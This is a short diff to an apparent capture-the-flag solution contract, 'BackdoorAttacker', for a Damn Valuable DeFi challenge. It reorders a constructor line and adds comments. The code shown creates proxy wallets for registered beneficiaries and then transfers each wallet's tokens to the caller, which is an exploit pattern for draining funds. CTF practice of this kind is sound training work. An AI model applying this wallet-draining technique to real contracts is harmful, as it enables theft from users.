@@ -19,8 +19,8 @@ contract BackdoorAttacker {
     ) {
         masterCopy = _masterCopy;
         walletFactory = _walletFactory;
-        dvt = DamnValuableToken(_token);
         registry = _registry;
+        dvt = DamnValuableToken(_token);
     }
 
     function delegateApprove(address _spender) external {
@@ -28,6 +28,7 @@ contract BackdoorAttacker {
     }
 
     function attack(address[] memory _beneficiaries) external {
+        // For every registered user we'll create a wallet
         for (uint256 i = 0; i < 4; i++) {
             address[] memory beneficiary = new address[](1);
             beneficiary[0] = _beneficiaries[i];
@@ -54,6 +55,7 @@ contract BackdoorAttacker {
                 IProxyCreationCallback(registry) //  callback => Function that will be called after the new proxy contract has been deployed and initialized.
             );
 
+            //Transfer to caller
             dvt.transferFrom(address(_newProxy), msg.sender, 10 ether);
         }
     }
